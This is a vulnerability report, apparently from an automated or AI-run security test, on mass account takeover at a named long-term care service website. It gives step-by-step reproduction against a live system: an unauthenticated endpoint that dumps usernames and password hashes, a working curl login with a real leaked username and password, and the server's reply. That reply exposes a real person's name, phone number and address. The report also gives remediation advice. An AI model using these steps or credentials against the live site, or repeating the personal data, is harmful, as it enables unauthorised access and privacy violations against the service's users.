# ltc.tzuchi.org.tw mass account takeover via exposed usernames + 471 default "123456" passwords

- ID: `0de8b0a4-ce42-4e5b-98f0-cacb10c2dd3b`
- Severity: **high**
- Status: open
- Type: Weak Credentials / Account Takeover (CWE-798, CWE-259)
- Target: `https://ltc.tzuchi.org.tw/LongtermCareService/api_app/login`
- Conversation: `3b694297-0b84-41bc-a589-66652e232956`
- Created: 2026-09-03 03:34:26.870608079+08:00

## Description

ltc.tzuchi.org.tw LongtermCareService: 471 of 2132 user accounts use the password "123456" (MD5 e10adc3949ba59abbe56e057f20f883e), and the password hashes are exposed via the unauthenticated queryIDNumber endpoint. Verified account takeover: logging in with the leaked credential code=jimmy3 / pwd=123456 returns res:1 (success) and grants an authenticated session as 蕭明進 (userId=2). The login endpoint (/api_app/login) also has NO rate limiting or lockout observed, and client-side auth is enforced only via localStorage ($rootScope.isLogin), so a valid username+weak-password pair grants full app access.

## Reproduction

1. Query the user list: POST /LongtermCareService/api_backend/queryIDNumber with {} — collect userCode + userPw pairs.
2. Identify users with userPw=e10adc3949ba59abbe56e057f20f883e (password "123456").
3. Log in with any such user: POST /LongtermCareService/api_app/login with {"code":"<userCode>","pwd":"123456","device":3,"type":0} → res:1 success.

## Evidence

$ grep -oE '"userPw":"[a-f0-9]{32}"' ltc_users.json | sort | uniq -c | sort -rn | head -8
 471 "userPw":"e10adc3949ba59abbe56e057f20f883e"  (= MD5 "123456")
 195 "userPw":"b4af804009cb036a4ccdc33431ef9ac9"
 132 "userPw":"80da5d337bf9606dd59f3480a125201e"
 131 "userPw":"6a9edcb7b63821802aa44d35d531c9fc"
  40 "userPw":"7cec85c75537840dad40251576e5b757"

$ curl -s -X POST "https://ltc.tzuchi.org.tw/LongtermCareService/api_app/login" -H "Content-Type: application/json" -d '{"code":"jimmy3","pwd":"123456","device":3,"type":0}'
{"res":1,"resCode":9,"userId":2,"userEnable":99,"cphoneNo":"0921614909","tphoneNo":"0921614909","addressCode":"235","address":"中正路736號8樓之8 (原碼數位科技)","userName":"蕭明進"}

## Impact

An attacker can take over hundreds of user accounts (at minimum 471 using "123456") by combining the leaked username list (queryIDNumber) with trivially-guessable/default passwords. This enables impersonation of users, access to their personal data and any user-specific functionality, and potential further lateral movement if accounts have elevated privileges. Combined with the unauthenticated PII dump, this is a full credential + identity compromise at scale.

## Recommendation

Enforce strong unique password policies (disable "123456"); salt + strong-hash passwords; add login rate limiting, account lockout, and MFA for sensitive actions; server-side session/token validation; do not store or expose passwords in plaintext-recoverable form.
